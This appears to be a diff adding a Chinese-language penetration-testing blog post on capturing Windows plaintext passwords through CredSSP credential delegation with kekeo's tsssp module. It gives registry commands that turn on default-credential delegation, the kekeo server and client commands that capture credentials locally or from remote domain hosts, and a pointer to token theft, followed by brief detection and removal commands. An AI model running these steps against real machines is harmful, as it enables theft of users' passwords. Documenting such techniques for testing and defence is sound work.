@@ -1,0 +1,284 @@
+I"�1<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在渗透测试中，为了获得Windows系统中的用户口令，通常会选择读取lsass进程的内存。这种方法不仅需要获得系统的管理员权限，而且在更多情况下需要绕过系统对lsass进程的保护。</p>
+
+<p>我在之前的文章<a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D">《Windows下的密码hash——Net-NTLMv1介绍》</a>曾介绍过使用<a href="https://github.com/eladshamir/Internal-Monologue">InternalMonologue</a>获得当前用户凭据的方法(通过SSPI调用对NTLM身份验证包(MSV1_0)的本地过程调用，以计算出NetNTLM响应)，不需要对lsass进程操作。</p>
+
+<p>本文将要介绍另外一种获得当前用户口令的方法，同样不需要对lsass进程操作。</p>
+
+<p>这是Benjamin @gentilkiwi Delpy开源的<a href="https://github.com/gentilkiwi/kekeo">kekeo</a>在2018年添加的功能，只需要修改Windows系统的组策略，就能够以普通用户的权限获得用户的明文口令。</p>
+
+<p>本文将要对其中的原理进行简要介绍，分析不同环境下的利用思路，给出防御建议。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>实现原理</li>
+  <li>实现方法</li>
+  <li>利用分析</li>
+  <li>防御检测</li>
+</ul>
+
+<h2 id="0x02-实现原理">0x02 实现原理</h2>
+<hr />
+
+<h3 id="1基础知识">1.基础知识</h3>
+
+<h4 id="credssp">CredSSP</h4>
+
+<p>全称Credential Security Support Provider protocol</p>
+
+<p>CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器</p>
+
+<p>CredSSP通常应用于远程桌面服务(Remote Desktop Protocol)和Windows远程管理(Windows Remote Management)（例如Powershell Remoting）</p>
+
+<p>CredSSP提供了加密的传输层安全协议通道。协商协议使用Kerberos和NTLM</p>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider</p>
+
+<h3 id="2通过组策略设置credssp的凭据分配">2.通过组策略设置CredSSP的凭据分配</h3>
+
+<p>通过组策略可以指定使用CredSSP组件的应用程序是否发送默认凭据</p>
+
+<p>组策略位置：<code class="language-plaintext highlighter-rouge">Computer Configuration</code>-&gt;<code class="language-plaintext highlighter-rouge">Administrative Templates</code>-&gt;<code class="language-plaintext highlighter-rouge">System</code>-&gt;<code class="language-plaintext highlighter-rouge">Credentials Delegation</code></p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/2-1.PNG" alt="Alt text" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Allow delegating default credentials</code>表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据</p>
+
+<p><code class="language-plaintext highlighter-rouge">Allow delegating default credentials with NTLM-only server authentication</code>表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据</p>
+
+<p>组策略对应的注册表位置:<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation</code></p>
+
+<h3 id="3credssp的凭据分配在远程桌面服务上的应用">3.CredSSP的凭据分配在远程桌面服务上的应用</h3>
+
+<p>对于工作组环境，需要启用<code class="language-plaintext highlighter-rouge">Allow delegating default credentials with NTLM-only server authentication</code></p>
+
+<p>对于域环境，需要启用<code class="language-plaintext highlighter-rouge">Allow delegating default credentials</code></p>
+
+<p>开启对应的组策略后，在使用远程桌面连接时，会自动发送当前用户的凭据(明文格式，不是hash)</p>
+
+<p>数据结构如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TSPasswordCreds ::= SEQUENCE {
+         domainName  [0] OCTET STRING,
+         userName    [1] OCTET STRING,
+         password    [2] OCTET STRING
+ }
+</code></pre></div></div>
+
+<p>参考资料：</p>
+
+<p>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cssp/17773cc4-21e9-4a75-a0dd-72706b174fe5</p>
+
+<h3 id="4实现原理">4.实现原理</h3>
+
+<p>综上，如果我们实现以下操作：</p>
+
+<ul>
+  <li>修改主机A的组策略，设置为自动发送当前用户的凭据</li>
+  <li>在主机B上面实现服务端的功能，接收主机A发送的请求</li>
+</ul>
+
+<p>那么当我们控制主机A连接主机B时，主机B就能够获得主机A用户的明文口令</p>
+
+<p>CredSSP协议细节可参考：</p>
+
+<p>https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cssp/85f57821-40bb-46aa-bfcb-ba9590b8fc30</p>
+
+<p>更近一步，如果我们实现以下操作：</p>
+
+<ul>
+  <li>修改主机A的组策略，设置为自动发送当前用户的凭据</li>
+  <li>在主机A上面实现服务端的功能，接收主机A自己发送的请求</li>
+</ul>
+
+<p>我们同样能够获得用户的明文口令</p>
+
+<p><strong>注：</strong></p>
+
+<p>keko的实现方式是通过SMB协议创建命名管道，而不是RDP协议</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/2-2.PNG" alt="Alt text" /></p>
+
+<h2 id="0x03-实现方法">0x03 实现方法</h2>
+<hr />
+
+<p>通过修改注册表的方式添加组策略，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1
+reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1
+reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1
+reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1
+reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials /v 1 /t REG_SZ /d *
+reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d *
+</code></pre></div></div>
+
+<p>添加组策略后，需要等待用户重新登录并输入凭据后才能生效，例如锁屏、注销或重启等</p>
+
+<p>对于不同的网络环境，实现方法存在差异</p>
+
+<h3 id="1工作组网络">1.工作组网络</h3>
+
+<p>身份验证方式为NTLM</p>
+
+<h4 id="1抓取本机口令">(1)抓取本机口令</h4>
+
+<p>建立服务器的kekeo命令如下(普通用户权限)：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tsssp::server
+</code></pre></div></div>
+
+<p>连接服务器的kekeo命令如下(普通用户权限)：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tsssp::client /target:anyword
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/3-1.PNG" alt="Alt text" /></p>
+
+<p><strong>注：</strong></p>
+
+<p>抓取本机口令时，<code class="language-plaintext highlighter-rouge">target</code>参数可以设置为任意字符</p>
+
+<h3 id="2域网络">2.域网络</h3>
+
+<p>身份验证方式为Kerberos</p>
+
+<h4 id="1抓取本机口令-1">(1)抓取本机口令</h4>
+
+<p>建立服务器的kekeo命令如下(普通用户权限)：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tsssp::server
+</code></pre></div></div>
+
+<p>连接服务器的kekeo命令如下(普通用户权限)：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tsssp::client /target:anyword
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>抓取本机口令时，<code class="language-plaintext highlighter-rouge">target</code>参数可以设置为任意字符</p>
+
+<h4 id="2抓取远程主机口令">(2)抓取远程主机口令</h4>
+
+<p>建立服务器的kekeo命令如下(System权限)：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tsssp::server
+</code></pre></div></div>
+
+<p>连接服务器的kekeo命令如下(普通用户权限)：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tsssp::client /target:TERMSRV/COMPUTER01.test.com /pipe:\\COMPUTER01.test.com\pipe\kekeo_tsssp_endpoint
+</code></pre></div></div>
+
+<p>结果如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/3-2.PNG" alt="Alt text" /></p>
+
+<p>这里使用的参数为域内计算机帐户对应的SPN</p>
+
+<p>查看当前域内的所有SPN可以使用setspn命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -q */*
+</code></pre></div></div>
+
+<p>查看test域内的所有SPN：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setspn.exe -T test -q */*
+</code></pre></div></div>
+
+<h2 id="0x04-利用分析">0x04 利用分析</h2>
+<hr />
+
+<h3 id="1优点">1.优点</h3>
+
+<p>不需要同lsass进程交互，所以能够绕过对lsass进程的保护</p>
+
+<p>在修改组策略后，只需要普通用户权限就能实现</p>
+
+<p><strong>注：</strong></p>
+
+<p>添加组策略后，需要等待用户重新登录并输入凭据后才能生效，例如锁屏、注销或重启等</p>
+
+<h3 id="2其他利用思路">2.其他利用思路</h3>
+
+<h4 id="1代码的提取">(1)代码的提取</h4>
+
+<p>我将kekeo的<code class="language-plaintext highlighter-rouge">tsssp::client</code>功能单独提取出来，地址如下：</p>
+
+<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/tsssp_client.cpp</p>
+
+<p>代码支持连接本地和远程服务器</p>
+
+<p>只需要填写pipi参数，我的代码会将target参数自动补全为<code class="language-plaintext highlighter-rouge">TERMSRV/&lt;spn&gt;</code></p>
+
+<p>连接本地的命令示例:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tsssp_client.exe localhost
+</code></pre></div></div>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/4-1.PNG" alt="Alt text" /></p>
+
+<p>连接远程服务器的命令示例:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tsssp_client.exe Computer01.test.com
+</code></pre></div></div>
+
+<p>测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/4-2.PNG" alt="Alt text" /></p>
+
+<p>kekeo的<code class="language-plaintext highlighter-rouge">tsssp::server</code>功能需要安装<a href="http://www.oss.com/asn1/products/asn1-c/asn1-c.html">OSS ASN.1/C</a></p>
+
+<p><strong>注：</strong></p>
+
+<p>使用试用版的OSS ASN.1/C编译生成的exe文件无法在未安装OSS ASN.1/C的系统下使用</p>
+
+<h4 id="2抓取其他用户的口令">(2)抓取其他用户的口令</h4>
+
+<p>使用其他用户的token启动kekeo.exe或者tsssp_client.exe即可</p>
+
+<p>token的利用方法可参考<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8">《渗透技巧——Token窃取与利用》</a></p>
+
+<h2 id="0x05-防御检测">0x05 防御检测</h2>
+<hr />
+
+<p>1.查询组策略配置</p>
+
+<p>查询注册表的cmd命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg query hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation
+</code></pre></div></div>
+
+<p>2.删除组策略配置</p>
+
+<p>删除注册表项的cmd命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg delete hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /f
+</code></pre></div></div>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr />
+
+<p>本文介绍了<a href="https://github.com/gentilkiwi/kekeo">kekeo</a>的<code class="language-plaintext highlighter-rouge">tsssp</code>模块在不同环境下的利用方法，结合利用思路给出防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
